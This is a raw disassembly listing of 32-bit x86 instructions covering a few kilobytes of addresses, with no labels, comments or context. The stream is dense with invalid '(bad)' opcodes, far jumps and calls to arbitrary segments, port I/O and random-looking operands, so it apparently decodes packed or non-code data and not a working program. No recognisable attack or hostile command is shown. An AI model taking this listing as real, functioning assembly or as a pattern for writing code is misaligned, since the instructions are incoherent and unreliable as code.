  41e67d:	pop    ecx
  41e67e:	bound  ebp,QWORD PTR ds:0xe0690a95
  41e684:	dec    ebp
  41e685:	adc    eax,0x345fac34
  41e68a:	pop    ds
  41e68b:	call   0x831:0xba14b570
  41e692:	jb     0x41e667
  41e694:	sbb    al,0x1e
  41e696:	fsub   st,st(5)
  41e698:	leave  
  41e699:	dec    esp
  41e69a:	loopne 0x41e6eb
  41e69c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e69d:	ret    0xf10d
  41e6a0:	pop    ds
  41e6a1:	ins    BYTE PTR es:[edi],dx
  41e6a2:	les    eax,FWORD PTR [esi]
  41e6a4:	rcr    edi,cl
  41e6a6:	push   0x31
  41e6a8:	jmp    0xf95c:0xd4dcbfc
  41e6af:	icebp  
  41e6b0:	in     al,dx
  41e6b1:	(bad)  
  41e6b2:	in     al,dx
  41e6b3:	pop    ebp
  41e6b4:	cmp    dl,al
  41e6b6:	stos   BYTE PTR es:[edi],al
  41e6b7:	(bad)  
  41e6b8:	nop
  41e6b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6ba:	aad    0x4f
  41e6bc:	or     esp,DWORD PTR [esi+0x759e6bd5]
  41e6c2:	adc    cl,ah
  41e6c4:	int3   
  41e6c5:	sub    eax,0xb9042207
  41e6ca:	sub    al,0xf6
  41e6cc:	push   0xc95111cb
  41e6d1:	fimul  DWORD PTR [esi]
  41e6d3:	out    0x3b,al
  41e6d5:	push   ds
  41e6d6:	mov    ebp,0x6e89d8c7
  41e6db:	cmp    edi,DWORD PTR [edx-0x35]
  41e6de:	je     0x41e73e
  41e6e0:	or     al,0x72
  41e6e2:	push   es
  41e6e3:	rol    BYTE PTR ds:0x26385407,cl
  41e6e9:	out    dx,eax
  41e6ea:	test   eax,0xd93f0e57
  41e6ef:	mov    DWORD PTR [eax-0x6a32b230],ebp
  41e6f5:	push   ebp
  41e6f6:	data16 jno 0x41e688
  41e6f9:	or     DWORD PTR [ebx-0x4],ecx
  41e6fc:	or     al,0x58
  41e6fe:	jmp    0xd4d43b49
  41e703:	pusha  
  41e704:	jle    0x41e6c1
  41e706:	iret   
  41e707:	xchg   esi,eax
  41e708:	fwait
  41e709:	rol    BYTE PTR [edi+ebp*8+0x8],cl
  41e70d:	cmp    dl,bl
  41e70f:	arpl   WORD PTR [eax-0x3],sp
  41e712:	pop    esp
  41e713:	ds cdq 
  41e715:	push   ds
  41e716:	popa   
  41e717:	pop    ebx
  41e718:	js     0x41e6d8
  41e71a:	test   eax,0xacf1a6e4
  41e71f:	or     BYTE PTR [esi+ecx*1+0x7a07880a],cl
  41e726:	adc    BYTE PTR [ebx+0x3f],cl
  41e729:	iret   
  41e72a:	popf   
  41e72b:	pop    ecx
  41e72c:	xor    al,0xc6
  41e72e:	jne    0x41e6ea
  41e730:	jl     0x41e6ed
  41e732:	or     DWORD PTR [eax-0x196f8c15],esp
  41e738:	jmp    0x19b666c8
  41e73d:	jno    0x41e78d
  41e73f:	icebp  
  41e740:	xlat   BYTE PTR ds:[ebx]
  41e741:	stos   DWORD PTR es:[edi],eax
  41e742:	xchg   esi,esi
  41e744:	jmp    0x41e77d
  41e746:	pop    ds
  41e747:	jbe    0x41e6cb
  41e749:	sub    eax,0xa02f3347
  41e74e:	scas   eax,DWORD PTR es:[edi]
  41e74f:	inc    ecx
  41e750:	xchg   edx,eax
  41e751:	lahf   
  41e752:	daa    
  41e753:	dec    BYTE PTR [edi-0x4a]
  41e756:	and    al,0xea
  41e758:	fist   WORD PTR [edx+0x5a811a07]
  41e75e:	pop    ebx
  41e75f:	aaa    
  41e760:	or     BYTE PTR [esi+edi*4-0x5d1b6771],dh
  41e767:	int    0xb4
  41e769:	sbb    ecx,DWORD PTR [ebp+eiz*2-0x3d1d5c08]
  41e770:	adc    al,BYTE PTR [eax+0x36]
  41e773:	sahf   
  41e774:	and    al,0xe0
  41e776:	imul   edx,DWORD PTR [ebp+0x72b1e05e],0xffffffe8
  41e77d:	xchg   esi,eax
  41e77e:	in     al,dx
  41e77f:	sti    
  41e780:	adc    eax,0x43488f4d
  41e785:	and    eax,0x5bca6c62
  41e78a:	inc    ebx
  41e78b:	not    BYTE PTR [esi+0x46]
  41e78e:	xchg   DWORD PTR [ebx-0x61],ebx
  41e791:	pop    esi
  41e792:	jmp    0x41e77b
  41e794:	sub    eax,0xc93e513d
  41e799:	jecxz  0x41e7c4
  41e79b:	in     al,0x38
  41e79d:	scas   eax,DWORD PTR es:[edi]
  41e79e:	mov    ebp,0x7109c213
  41e7a3:	dec    ebx
  41e7a4:	lea    esp,[ebp+0x19e2f79b]
  41e7aa:	dec    ecx
  41e7ab:	retf   
  41e7ac:	ss adc eax,0x485566f3
  41e7b2:	or     eax,0x10dc3cf
  41e7b7:	push   esi
  41e7b8:	(bad)  
  41e7b9:	hlt    
  41e7ba:	mov    ebp,0xcccd6f83
  41e7bf:	je     0x41e814
  41e7c1:	popf   
  41e7c2:	(bad)  
  41e7c4:	aas    
  41e7c5:	retf   0x43f9
  41e7c8:	test   BYTE PTR [ecx],ch
  41e7ca:	sbb    ecx,DWORD PTR [esi+ebx*1-0x374a0ca3]
  41e7d1:	pusha  
  41e7d2:	xor    BYTE PTR [ebx-0x39],0x1
  41e7d6:	jge    0x41e787
  41e7d8:	arpl   bp,dx
  41e7da:	xchg   DWORD PTR [edi-0x77],esi
  41e7dd:	add    dl,ch
  41e7df:	ds repnz out dx,eax
  41e7e2:	(bad)  
  41e7e3:	or     al,0xfc
  41e7e5:	xor    DWORD PTR [esi-0x34862b17],esp
  41e7eb:	sub    al,0x73
  41e7ed:	or     al,0x1e
  41e7ef:	mov    dl,0x6
  41e7f1:	loopne 0x41e794
  41e7f3:	inc    edi
  41e7f4:	dec    edx
  41e7f5:	iret   
  41e7f6:	sar    esi,1
  41e7f8:	dec    esp
  41e7f9:	push   ecx
  41e7fa:	stos   BYTE PTR es:[edi],al
  41e7fb:	outs   dx,DWORD PTR ds:[esi]
  41e7fc:	push   0xe619abc7
  41e801:	mov    esp,0xb8d274ca
  41e806:	xor    dl,bh
  41e808:	cs test eax,0x4e0b29a9
  41e80e:	cld    
  41e80f:	and    al,0xa3
  41e811:	in     al,0x33
  41e813:	arpl   WORD PTR [ecx-0x70],cx
  41e816:	ror    DWORD PTR [ecx-0xbd473d6],1
  41e81c:	dec    esi
  41e81d:	inc    edx
  41e81e:	xor    DWORD PTR [esp+edi*4-0x61],esp
  41e822:	pop    ds
  41e823:	jbe    0x41e858
  41e825:	rcr    ah,1
  41e827:	xchg   esi,eax
  41e828:	in     eax,0x6f
  41e82a:	loopne 0x41e8aa
  41e82c:	in     eax,0x91
  41e82e:	xchg   ebx,eax
  41e82f:	mov    ?,WORD PTR [ebp+0x4d349b76]
  41e835:	xchg   DWORD PTR [ebx+0x41],ebx
  41e838:	xor    al,0xed
  41e83a:	jmp    0x41e88f
  41e83c:	and    BYTE PTR ds:0xc5f88648,bh
  41e842:	sbb    DWORD PTR [eax-0x2358ce72],0x242f6d42
  41e84c:	xlat   BYTE PTR ds:[ebx]
  41e84d:	in     al,0x3f
  41e84f:	add    eax,0x67c28c66
  41e854:	or     edi,ebx
  41e856:	stos   DWORD PTR es:[edi],eax
  41e857:	inc    eax
  41e858:	push   edi
  41e859:	ds adc al,0xdd
  41e85c:	test   al,0x90
  41e85e:	imul   ebp,DWORD PTR [ecx],0xffffffc6
  41e861:	and    DWORD PTR [esp+ebp*8],esi
  41e864:	jns    0x41e8a5
  41e866:	mov    ebx,0xf2e23d4
  41e86b:	jp     0x41e893
  41e86d:	fadd   DWORD PTR [esi+0x49]
  41e870:	push   ebp
  41e871:	sbb    BYTE PTR [esi-0x24],cl
  41e874:	xchg   DWORD PTR [esi],ebx
  41e876:	icebp  
  41e877:	xor    al,BYTE PTR [esi]
  41e879:	fiadd  WORD PTR [esi-0x7d]
  41e87c:	xchg   ebp,eax
  41e87d:	aad    0xac
  41e87f:	rol    DWORD PTR [esp+eiz*8-0x446c52ef],1
  41e886:	div    ah
  41e888:	pop    ss
  41e889:	in     al,dx
  41e88a:	stos   BYTE PTR es:[edi],al
  41e88b:	and    eax,0xcc7929db
  41e890:	mov    cl,0x4f
  41e892:	push   esi
  41e893:	jge    0x41e914
  41e895:	xor    dh,ch
  41e897:	hlt    
  41e898:	rol    DWORD PTR [eax],0x9b
  41e89b:	pop    ds
  41e89c:	int3   
  41e89d:	mov    ch,0xeb
  41e89f:	xchg   DWORD PTR [edi],ecx
  41e8a1:	test   al,0x2a
  41e8a3:	inc    edx
  41e8a4:	dec    ecx
  41e8a5:	loope  0x41e91d
  41e8a7:	pop    eax
  41e8a8:	sbb    al,0xee
  41e8aa:	xchg   edx,eax
  41e8ab:	xor    DWORD PTR [esi+0x20ff234b],0xf5ba7f78
  41e8b5:	mov    ah,0x67
  41e8b7:	aaa    
  41e8b8:	and    dh,dh
  41e8ba:	mov    edi,0x9a8221fe
  41e8bf:	cld    
  41e8c0:	xchg   BYTE PTR [ebp+0x556230d6],ah
  41e8c6:	ins    BYTE PTR es:[edi],dx
  41e8c7:	ins    DWORD PTR es:[edi],dx
  41e8c8:	bound  ebp,QWORD PTR [ebp+eiz*8-0x3b1f667c]
  41e8cf:	sbb    eax,0xe71fa0bc
  41e8d4:	popa   
  41e8d5:	or     ebp,edi
  41e8d7:	push   ebx
  41e8d8:	xchg   esp,eax
  41e8d9:	dec    eax
  41e8da:	jmp    esp
  41e8dc:	dec    bp
  41e8de:	arpl   sp,bx
  41e8e0:	inc    eax
  41e8e1:	ds mov bh,0xda
  41e8e4:	call   0x446e:0xf4f07acc
  41e8eb:	and    al,0xe4
  41e8ed:	jb     0x41e8f8
  41e8ef:	push   cs
  41e8f0:	adc    eax,0x86ab0a0d
  41e8f5:	mov    ch,0xe5
  41e8f7:	xchg   ebx,eax
  41e8f8:	mov    eax,ds:0xe928b9fd
  41e8fd:	gs pop ds
  41e8ff:	packssdw mm1,mm3
  41e902:	dec    eax
  41e903:	mov    esp,esp
  41e905:	sbb    ebp,DWORD PTR [eax+ebx*1+0x76]
  41e909:	ins    DWORD PTR es:[edi],dx
  41e90a:	in     al,dx
  41e90b:	mov    cl,0x46
  41e90d:	dec    edx
  41e90e:	fsub   QWORD PTR ds:0x3d18290e
  41e914:	jbe    0x41e8e1
  41e916:	xchg   ebp,eax
  41e917:	mov    bh,0x9f
  41e919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e91a:	pusha  
  41e91b:	ins    DWORD PTR es:[edi],dx
  41e91c:	and    eax,0xd2cf0911
  41e921:	push   es
  41e922:	xchg   ebp,eax
  41e923:	lods   eax,DWORD PTR ds:[esi]
  41e924:	mov    ah,0x58
  41e926:	mov    ecx,0xf20929a3
  41e92b:	add    eax,0xb214a89a
  41e930:	mov    cl,0xc5
  41e932:	clc    
  41e933:	xor    BYTE PTR [edi-0x4d],al
  41e936:	sbb    cl,0x20
  41e939:	shl    ah,0x76
  41e93c:	mov    edi,0x4a52ef70
  41e941:	xchg   ebx,eax
  41e942:	mov    DWORD PTR [edx],0x214399de
  41e948:	mov    eax,ds:0x3d726807
  41e94d:	sahf   
  41e94e:	pushf  
  41e94f:	add    eax,0xcafda212
  41e954:	inc    edi
  41e955:	addr16 xchg ebx,eax
  41e957:	cmp    dl,BYTE PTR [edx-0x5b8b12f1]
  41e95d:	mov    edx,0xa96523fe
  41e962:	xchg   edi,eax
  41e963:	sti    
  41e964:	jmp    0xed2a:0x4a8f427d
  41e96b:	add    edx,edx
  41e96d:	retf   
  41e96e:	push   edi
  41e96f:	dec    edx
  41e970:	lahf   
  41e971:	sahf   
  41e972:	sbb    dl,dl
  41e974:	into   
  41e975:	jg     0x41e8fd
  41e977:	pop    ss
  41e978:	(bad)  [ebx-0x6c]
  41e97b:	push   ds
  41e97c:	fld    DWORD PTR [edx+0x46]
  41e97f:	pop    ebp
  41e980:	pop    ecx
  41e981:	mov    dl,0xbe
  41e983:	(bad)  
  41e985:	aam    0xb5
  41e987:	cmp    bl,ch
  41e989:	jo     0x41e9a5
  41e98b:	push   0x98dca9f2
  41e990:	loope  0x41e961
  41e992:	add    DWORD PTR [esi+0x2a02dcee],ebx
  41e998:	mov    esi,0x576a5081
  41e99d:	pop    eax
  41e99e:	cmp    ebx,ebx
  41e9a0:	mov    bh,bl
  41e9a2:	inc    edi
  41e9a3:	mov    esp,0x36dec86a
  41e9a8:	mov    BYTE PTR [ecx+0x60],0x55
  41e9ac:	retf   0x6583
  41e9af:	clc    
  41e9b0:	cmp    dh,BYTE PTR [ebx+esi*8]
  41e9b3:	jp     0x41e9b9
  41e9b5:	(bad)  
  41e9b6:	retf   0xd327
  41e9b9:	lods   eax,DWORD PTR ds:[esi]
  41e9ba:	xchg   BYTE PTR [eax+0xb],al
  41e9bd:	mov    ebp,0x4d3c0c77
  41e9c2:	rol    al,0xa4
  41e9c5:	(bad)  
  41e9c6:	into   
  41e9c7:	jle    0x41ea10
  41e9c9:	jl     0x41e9aa
  41e9cb:	add    dl,cl
  41e9cd:	imul   ecx,DWORD PTR [ebx],0xffffff8d
  41e9d0:	push   edi
  41e9d1:	dec    esi
  41e9d2:	ret    0xdb4f
  41e9d5:	jbe    0x41e9bc
  41e9d7:	aas    
  41e9d8:	repz add esp,esi
  41e9db:	fcomp  DWORD PTR [edi-0x2d]
  41e9de:	adc    BYTE PTR [ecx+0x7614e07b],bh
  41e9e4:	mov    esi,0x94730ceb
  41e9e9:	aad    0xd7
  41e9eb:	and    eax,0x76580ba4
  41e9f0:	push   ss
  41e9f1:	sub    al,0x2b
  41e9f3:	jp     0x41e9d8
  41e9f5:	xor    ebx,DWORD PTR [esi+0x22]
  41e9f8:	mov    bl,dh
  41e9fa:	xor    ebp,DWORD PTR [edi+0x1d9e15d]
  41ea00:	mov    BYTE PTR [ebp-0x17a833a0],bl
  41ea06:	mov    esp,0xc6d396b8
  41ea0b:	xor    eax,0xbad4fd3c
  41ea10:	or     esi,edx
  41ea12:	aaa    
  41ea13:	shl    BYTE PTR [esi],1
  41ea15:	in     eax,dx
  41ea16:	cmc    
  41ea17:	sbb    edx,DWORD PTR [edi+eiz*1]
  41ea1a:	icebp  
  41ea1b:	push   es
  41ea1c:	repz adc cl,BYTE PTR [edx+0x310218d7]
  41ea23:	or     edi,DWORD PTR [ecx]
  41ea25:	fidivr DWORD PTR [edi-0x5]
  41ea28:	dec    edi
  41ea29:	mov    esi,0xf0fe65de
  41ea2e:	mov    esp,0xc6e13798
  41ea33:	mov    al,ds:0xe8eaecb7
  41ea38:	dec    edi
  41ea39:	cmp    al,0xd2
  41ea3b:	adc    esi,eax
  41ea3d:	std    
  41ea3e:	or     DWORD PTR [ebp+0x4a5dbf6c],ebp
  41ea44:	add    DWORD PTR [edi-0x62],edx
  41ea47:	fisttp DWORD PTR [ebx+0x6]
  41ea4a:	icebp  
  41ea4b:	dec    ecx
  41ea4c:	cmp    eax,0xf079dc59
  41ea51:	out    dx,al
  41ea52:	cs mov esp,?
  41ea55:	outs   dx,BYTE PTR ds:[esi]
  41ea56:	jp     0x41ea4f
  41ea58:	dec    edi
  41ea59:	push   ebx
  41ea5a:	dec    ecx
  41ea5b:	push   es
  41ea5c:	ficomp WORD PTR [edx-0x61]
  41ea5f:	xor    BYTE PTR [ebx+0x66ac6e64],0xa9
  41ea66:	cli    
  41ea67:	in     al,0x90
  41ea69:	pop    edi
  41ea6a:	es out 0x51,al
  41ea6d:	pushf  
  41ea6e:	imul   ebp,DWORD PTR [eax-0x3f],0x5f
  41ea72:	(bad)  
  41ea73:	push   ss
  41ea74:	jne    0x41ea1e
  41ea76:	sub    eax,0x6866aee2
  41ea7b:	or     ah,cl
  41ea7d:	dec    esi
  41ea7e:	add    BYTE PTR [edx+0x5d235af1],0x1
  41ea85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea86:	or     DWORD PTR [esi+eax*8],ebx
  41ea89:	mov    bl,dl
  41ea8b:	mov    eax,ds:0xf7a848d
  41ea90:	inc    eax
  41ea91:	pop    esp
  41ea92:	and    BYTE PTR [edx+0x340f3b91],dh
  41ea98:	add    ecx,DWORD PTR [esi]
  41ea9a:	call   0x4d04709
  41ea9f:	xchg   BYTE PTR [ebx],cl
  41eaa1:	setno  al
  41eaa4:	adc    al,0x8d
  41eaa6:	push   ss
  41eaa7:	inc    ecx
  41eaa8:	repz loope 0x41eacc
  41eaab:	pop    esi
  41eaac:	daa    
  41eaad:	inc    esi
  41eaae:	xor    BYTE PTR [edi],cl
  41eab0:	sbb    eax,0x6f93d4ef
  41eab5:	test   edi,0xe93673b5
  41eabb:	fcomp  QWORD PTR [eax]
  41eabd:	sysexit 
  41eabf:	jl     0x41eab1
  41eac1:	push   0xffffffb5
  41eac3:	xchg   esp,eax
  41eac4:	add    al,0x9c
  41eac6:	jmp    0x4936:0x5e6d2e3b
  41eacd:	adc    ecx,DWORD PTR [ebx]
  41eacf:	xor    al,0xc6
  41ead1:	ds cmp al,0xb3
  41ead4:	push   0x6e
  41ead6:	sub    al,0x9c
  41ead8:	jmp    0x9566:0x52cdc092
  41eadf:	jnp    0x41ea93
  41eae1:	xchg   esp,eax
  41eae2:	adc    DWORD PTR [esi+edi*1+0x3d],0xa4879cf0
  41eaea:	mov    ah,0x97
  41eaec:	jnp    0x41eab6
  41eaee:	push   0xffffff9b
  41eaf0:	fld    QWORD PTR [ebp+0x24083cf2]
  41eaf6:	mov    al,ds:0xf8219c1
  41eafb:	aaa    
  41eafc:	xor    al,0x7b
  41eafe:	and    DWORD PTR [esp+ebx*8+0x34],ebx
  41eb02:	into   
  41eb03:	enter  0xfe31,0xa5
  41eb07:	or     al,0xba
  41eb09:	adc    eax,0x85ddb6da
  41eb0e:	xchg   ecx,eax
  41eb0f:	repnz mov ch,ch
  41eb12:	or     DWORD PTR [edi-0x67f60563],ecx
  41eb18:	fmul   st,st(3)
  41eb1a:	mov    edx,0xefbf828e
  41eb1f:	mov    al,0x6f
  41eb21:	jecxz  0x41eb34
  41eb23:	jge    0x41eadf
  41eb25:	test   eax,0x9fc155e7
  41eb2a:	ficom  DWORD PTR [eax+ebp*1-0x66]
  41eb2e:	cmp    eax,DWORD PTR [ebx+0x5e40ad09]
  41eb34:	mov    al,0xba
  41eb36:	cmp    BYTE PTR [ebp+0x61],bh
  41eb39:	mov    edx,0xa8640dc
  41eb3e:	aam    0x7
  41eb40:	inc    ebp
  41eb41:	stos   BYTE PTR es:[edi],al
  41eb42:	idiv   DWORD PTR [ebx-0x52]
  41eb45:	not    BYTE PTR [esi+eax*8-0x2d]
  41eb49:	lods   al,BYTE PTR ds:[esi]
  41eb4a:	sahf   
  41eb4b:	mov    ecx,0xb17e2268
  41eb50:	cld    
  41eb51:	mov    ebx,0xa477cd15
  41eb56:	inc    ebx
  41eb57:	cmc    
  41eb58:	gs inc esi
  41eb5a:	mov    esp,edx
  41eb5c:	ins    DWORD PTR es:[edi],dx
  41eb5d:	xor    BYTE PTR [eax+0x36],dh
  41eb60:	fbstp  TBYTE PTR [eax]
  41eb62:	aas    
  41eb63:	push   ebp
  41eb64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb65:	(bad)  
  41eb66:	push   esp
  41eb67:	rol    BYTE PTR [esi-0x12],0x81
  41eb6b:	sub    al,0x98
  41eb6d:	ror    DWORD PTR [eax],1
  41eb6f:	mov    dl,BYTE PTR [esi+0x7c6ee1b4]
  41eb75:	jnp    0x41eb54
  41eb77:	mov    bl,0x32
  41eb79:	addr16 retf 0x2367
  41eb7d:	adc    esi,DWORD PTR [edi]
  41eb7f:	jle    0x41eba5
  41eb81:	adc    DWORD PTR [edi-0x28],0xedac1ee2
  41eb88:	arpl   WORD PTR [esi+0x1c],si
  41eb8b:	imul   BYTE PTR [edx+0xbdffb9f]
  41eb91:	ret    0x8f26
  41eb94:	sub    ecx,DWORD PTR [esi+0x4599d10]
  41eb9a:	adc    bl,BYTE PTR [ecx+0x420043ad]
  41eba0:	sub    edi,DWORD PTR [ecx+0x60]
  41eba3:	jb     0x41eb30
  41eba5:	ds in  eax,dx
  41eba7:	inc    esp
  41eba8:	punpckhdq mm3,QWORD PTR [ecx+ebp*2]
  41ebac:	xchg   BYTE PTR [ebp-0xb6d280d],dl
  41ebb2:	jg     0x41ec06
  41ebb4:	and    al,0x52
  41ebb6:	fmul   st(6),st
  41ebb8:	(bad)  
  41ebb9:	mov    edi,0x57669296
  41ebbe:	fwait
  41ebbf:	and    ebx,ecx
  41ebc1:	jmp    0x41ec41
  41ebc3:	jmp    0x41ebcb
  41ebc5:	adc    cl,BYTE PTR [edi-0x1b]
  41ebc8:	ds ret 
  41ebca:	leave  
  41ebcb:	jecxz  0x41ec25
  41ebcd:	jno    0x41ebfa
  41ebcf:	mov    al,0xe
  41ebd1:	ds pop es
  41ebd3:	jmp    0x41eb5e
  41ebd5:	daa    
  41ebd6:	mov    esi,0x6dedd101
  41ebdb:	push   esp
  41ebdc:	out    dx,eax
  41ebdd:	into   
  41ebde:	push   edx
  41ebdf:	mov    BYTE PTR [eax+ebx*4+0x251daf8d],bh
  41ebe6:	bound  ebp,QWORD PTR [esi]
  41ebe8:	fmul   st,st(1)
  41ebea:	arpl   WORD PTR [esi+ecx*1+0x23],si
  41ebee:	(bad)  
  41ebf0:	aad    0x26
  41ebf2:	inc    ebx
  41ebf3:	adc    al,BYTE PTR [ebp-0x33]
  41ebf6:	mov    cl,0xd3
  41ebf8:	and    BYTE PTR ds:0xa452b826,dh
  41ebfe:	fist   DWORD PTR [eax+0x65]
  41ec01:	inc    edi
  41ec02:	stos   BYTE PTR es:[edi],al
  41ec03:	cli    
  41ec04:	es mov esp,0x5f747cc
  41ec0a:	adc    eax,0x493c6845
  41ec0f:	mov    DWORD PTR [ecx],ebx
  41ec11:	mov    ds:0x6fd51c00,al
  41ec16:	fldenv [ebp+0x62]
  41ec19:	mov    edi,0xd87e59aa
  41ec1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec1f:	xor    DWORD PTR [bp+0x7e],ecx
  41ec23:	dec    edx
  41ec24:	pop    ds
  41ec25:	cs sbb eax,0x4014b40c
  41ec2b:	out    dx,eax
  41ec2c:	adc    al,0xf1
  41ec2e:	sub    ecx,DWORD PTR [esp+edx*4-0x9]
  41ec32:	fsubr  DWORD PTR [ecx]
  41ec34:	(bad)  
  41ec35:	pop    ss
  41ec36:	adc    DWORD PTR [ecx],0xffffffab
  41ec39:	push   ds
  41ec3a:	fdivrp st(6),st
  41ec3c:	and    edx,DWORD PTR [ebx-0x7262da4f]
  41ec42:	in     eax,dx
  41ec43:	mov    dh,0xe3
  41ec45:	dec    esp
  41ec46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec47:	loope  0x41ebda
  41ec49:	int3   
  41ec4a:	xchg   esi,eax
  41ec4b:	push   ecx
  41ec4c:	mov    edi,0xd06086e7
  41ec51:	jnp    0x41ec79
  41ec53:	retf   
  41ec54:	dec    esi
  41ec55:	push   cs
  41ec56:	adc    DWORD PTR [esi],edx
  41ec58:	(bad)  
  41ec59:	cmp    al,0x72
  41ec5b:	and    edx,eax
  41ec5d:	cmp    esp,esi
  41ec5f:	outs   dx,BYTE PTR ds:[esi]
  41ec60:	popa   
  41ec61:	mov    dh,0x1f
  41ec63:	push   0x1473a909
  41ec68:	mov    esi,DWORD PTR [edi+ecx*2-0x4b0e8f8d]
  41ec6f:	push   ebx
  41ec70:	xor    edi,edx
  41ec72:	(bad)  
  41ec73:	fsubrp st(7),st
  41ec75:	iret   
  41ec76:	xchg   ecx,eax
  41ec77:	cmp    al,0x43
  41ec79:	hlt    
  41ec7a:	dec    ebp
  41ec7b:	mov    eax,0x86c6b7ad
  41ec80:	jbe    0x41ec73
  41ec82:	mov    ch,0xe9
  41ec84:	sub    al,0x50
  41ec86:	and    BYTE PTR [esi+0x8250ace],0x95
  41ec8d:	pop    ebx
  41ec8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec8f:	xor    ecx,eax
  41ec91:	xchg   edx,eax
  41ec92:	pop    esp
  41ec93:	ss sti 
  41ec95:	dec    ebx
  41ec96:	jne    0x41ec81
  41ec98:	ins    BYTE PTR es:[edi],dx
  41ec99:	daa    
  41ec9a:	(bad)
  41ec9e:	ds mov bh,ch
  41eca1:	push   cs
  41eca2:	(bad)  
  41eca3:	les    esp,FWORD PTR [eax-0x37]
  41eca6:	popa   
  41eca7:	hlt    
  41eca8:	or     BYTE PTR [ecx+ecx*2+0x77dd9fa3],dl
  41ecaf:	mov    DWORD PTR [edi],ebp
  41ecb1:	add    bl,dl
  41ecb3:	test   edi,esi
  41ecb5:	and    eax,0x3d8c177c
  41ecba:	jne    0x41ed3b
  41ecbc:	pop    ds
  41ecbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecbe:	test   eax,0xcd9ed9dd
  41ecc3:	push   DWORD PTR [esi+0x2c]
  41ecc6:	sbb    ecx,esi
  41ecc8:	push   edx
  41ecc9:	inc    edi
  41ecca:	repnz mov al,BYTE PTR [edx+0x76]
  41ecce:	nop
  41eccf:	mov    bh,0x96
  41ecd1:	pop    esi
  41ecd2:	or     BYTE PTR [esi],dl
  41ecd4:	daa    
  41ecd5:	pop    esp
  41ecd6:	or     edi,DWORD PTR [ebx-0x4a4360f]
  41ecdc:	not    bh
  41ecde:	out    dx,eax
  41ecdf:	adc    ecx,DWORD PTR [eax-0x1547a821]
  41ece5:	fldcw  WORD PTR [esi]
  41ece7:	rcl    DWORD PTR [esi+0x30],0xf
  41eceb:	sbb    BYTE PTR [edx+esi*4],al
  41ecee:	mov    WORD PTR [ebp+0x674745f8],?
  41ecf4:	mov    ebx,0x653736f6
  41ecf9:	in     eax,dx
  41ecfa:	cmp    edi,0x872bd46e
  41ed00:	inc    ebx
  41ed01:	rcr    BYTE PTR [ecx],1
  41ed03:	and    eax,0x70203034
  41ed08:	fwait
  41ed09:	into   
  41ed0a:	sbb    al,0x99
  41ed0c:	jecxz  0x41ed1a
  41ed0e:	cs sub eax,0x69005cb2
  41ed14:	and    DWORD PTR [ebx-0x2e80f21],ebp
  41ed1a:	call   0x346a:0x819232
  41ed21:	jmp    0xdb68:0x4f82e0ba
  41ed28:	sbb    edi,DWORD PTR [eax-0x18]
  41ed2b:	push   es
  41ed2c:	cwde   
  41ed2d:	cmp    al,0xe0
  41ed2f:	add    DWORD PTR [ebx-0x2a],edx
  41ed32:	bound  ebp,QWORD PTR ds:0xd30cacae
  41ed38:	lods   eax,DWORD PTR ds:[esi]
  41ed39:	or     dl,ah
  41ed3b:	mov    BYTE PTR [esi+0x1ef8b150],cl
  41ed41:	inc    ebp
  41ed42:	(bad)  
  41ed43:	dec    esp
  41ed44:	mov    cl,ah
  41ed46:	push   edi
  41ed47:	xchg   ecx,eax
  41ed48:	add    eax,0x3ad9edfa
  41ed4d:	stos   BYTE PTR es:[edi],al
  41ed4e:	mov    dh,0x9d
  41ed50:	fwait
  41ed51:	lea    esp,[ebp+0x3e]
  41ed54:	mov    bl,0x7f
  41ed56:	sub    BYTE PTR [eax+0x64],ah
  41ed59:	add    al,0x6d
  41ed5b:	or     ecx,ebx
  41ed5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed5e:	fwait
  41ed5f:	pop    ebx
  41ed60:	or     ebx,eax
  41ed62:	adc    al,0xb9
  41ed64:	push   0x3660f111
  41ed69:	ins    DWORD PTR es:[edi],dx
  41ed6a:	xor    al,BYTE PTR [esi+0x3c7428e8]
  41ed70:	out    0x9f,eax
  41ed72:	cwde   
  41ed73:	xchg   DWORD PTR [ebx+0x74],esi
  41ed76:	mov    ebp,0x95b432b4
  41ed7b:	sahf   
  41ed7c:	pushf  
  41ed7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed7e:	hlt    
  41ed7f:	je     0x41ed41
  41ed81:	(bad)  
  41ed82:	pusha  
  41ed83:	jno    0x41edb1
  41ed85:	mov    ah,0x9a
  41ed87:	sti    
  41ed88:	pop    es
  41ed89:	rcr    BYTE PTR [edx+edi*8+0x4ce0c1b3],0x9c
  41ed91:	mov    BYTE PTR [esi-0x5c],cl
  41ed94:	outs   dx,BYTE PTR ds:[esi]
  41ed95:	xchg   DWORD PTR [eax],ecx
  41ed97:	pop    esi
  41ed98:	and    edi,DWORD PTR [ecx+esi*2]
  41ed9b:	sbb    dl,0xf
  41ed9e:	aam    0x5
  41eda0:	dec    esp
  41eda1:	push   esp
  41eda2:	cwde   
  41eda3:	and    eax,0xa52f6ffd
  41eda8:	cmp    DWORD PTR [edi],ecx
  41edaa:	out    0x73,eax
  41edac:	push   esi
  41edad:	push   esp
  41edae:	pop    ds
  41edaf:	leave  
  41edb0:	and    bh,BYTE PTR [eax-0x80]
  41edb3:	add    BYTE PTR ds:0xdbd077dd,cl
  41edb9:	xchg   esp,eax
  41edba:	sub    ebp,eax
  41edbc:	xchg   esp,eax
  41edbd:	cmp    BYTE PTR [esi+0x34b5604b],ah
  41edc3:	cli    
  41edc4:	mov    ss:0x5253c0cd,eax
  41edca:	cld    
  41edcb:	and    al,0xaf
  41edcd:	adc    DWORD PTR [edx-0x7e4f8deb],eax
  41edd3:	adc    esp,DWORD PTR [esp+ecx*2+0x23]
  41edd7:	inc    ecx
  41edd8:	mov    eax,ds:0xf1e8f3a0
  41eddd:	jno    0x41ed74
  41eddf:	mov    edi,0x1a1ab5f4
  41ede4:	pop    edi
  41ede5:	idiv   DWORD PTR [esi]
  41ede7:	mov    edi,0xf333d055
  41edec:	push   ebp
  41eded:	sub    ch,ch
